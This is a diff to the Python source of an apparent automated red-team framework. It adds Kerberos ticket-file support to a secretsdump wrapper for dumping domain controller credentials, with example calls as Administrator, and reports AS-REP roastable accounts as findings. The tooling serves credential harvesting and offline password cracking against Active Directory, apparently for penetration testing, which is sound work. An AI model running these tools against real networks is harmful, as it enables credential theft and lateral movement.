@@ -87,7 +87,11 @@ class CredentialDiscoveryTools(Toolset):
     def _add_weakness(self, block: str) -> None:
         if not self.state or not block:
             return
-        if block not in self.state.weaknesses:
+        from ares.core.models import SharedRedTeamState
+
+        if isinstance(self.state, SharedRedTeamState):
+            self.state.add_weakness(block)
+        elif block not in self.state.weaknesses:
             self.state.weaknesses.append(block)
 
     def _add_credential(
@@ -958,6 +962,7 @@ class CredentialHarvestingTools(Toolset):
         domain: str | None = None,
         dc_ip: str | None = None,
         no_pass: bool = False,
+        ticket_path: str | None = None,
         timeout_minutes: int = 3,
         connection_timeout: int = 30,
         skip_connectivity_check: bool = False,
@@ -976,7 +981,8 @@ class CredentialHarvestingTools(Toolset):
             hash: NTLM hash for pass-the-hash authentication (optional)
             domain: Domain name (optional, can be inferred)
             dc_ip: Domain controller IP address (recommended for DC targets to avoid DNS issues)
-            no_pass: If True, use Kerberos golden ticket authentication
+            no_pass: If True, use Kerberos ticket authentication (-k -no-pass)
+            ticket_path: Path to .ccache ticket file for Kerberos auth (default: Administrator.ccache)
             timeout_minutes: Maximum time to spend dumping (default: 3)
             connection_timeout: Timeout for initial SMB connection in seconds (default: 30)
             skip_connectivity_check: Skip the SMB port check (default: False)
@@ -987,7 +993,8 @@ class CredentialHarvestingTools(Toolset):
         Example:
             >>> secretsdump("192.168.56.100", "admin", password="pass")  # pragma: allowlist secret
             >>> secretsdump("192.168.56.100", "admin", hash="aad3b4...")
-            >>> secretsdump("domain.local", "admin", no_pass=True)
+            >>> secretsdump("dc01.domain.local", "Administrator", no_pass=True)
+            >>> secretsdump("dc01.domain.local", "Administrator", no_pass=True, ticket_path="admin.ccache")
         """
         resolved_password = self._resolve_password(username, domain, password)
         if hash and not is_ntlm_hash(hash):
@@ -1034,7 +1041,8 @@ class CredentialHarvestingTools(Toolset):
         cmd.append(target_string)
 
         if no_pass:
-            cmd = ["env", "KRB5CCNAME=Administrator.ccache"] + cmd
+            ccache_file = ticket_path or "Administrator.ccache"
+            cmd = ["env", f"KRB5CCNAME={ccache_file}"] + cmd
 
         try:
             logger.info(f"[*] Running secretsdump on {target} with {username}")
@@ -1388,6 +1396,22 @@ class CredentialHarvestingTools(Toolset):
                     else:
                         self.state.hashes.append(hash_obj)
 
+                if matches:
+                    usernames = [
+                        m.split("$", 3)[3].split(":", 1)[0].split("@")[0]
+                        for m in matches
+                        if len(m.split("$", 3)) >= 4
+                    ]
+                    self._add_weakness(
+                        f"### AS-REP Roastable Accounts ({len(matches)} found)\n"
+                        f"**Vulnerability:** {len(matches)} account(s) have Kerberos "
+                        f"pre-authentication disabled, allowing offline password cracking.\n"
+                        f"- **Affected Resource:** {', '.join(usernames)}@{domain}\n"
+                        f"- **Discovery Method:** impacket-GetNPUsers (AS-REP roasting)\n"
+                        f"- **Impact:** Offline cracking may yield valid credentials for "
+                        f"lateral movement and privilege escalation."
+                    )
+
             return output
 
         except Exception as e:
@@ -1513,7 +1537,7 @@ class CrackingTools(Toolset):
 
         for username_raw in sorted(usernames):
             username = (username_raw or "").strip()
-            if not username or username.lower() in {"guest"}:
+            if not username or username.lower() == "guest":
                 continue
             if "/" in username or "\\" in username or username.endswith(".txt"):
                 continue
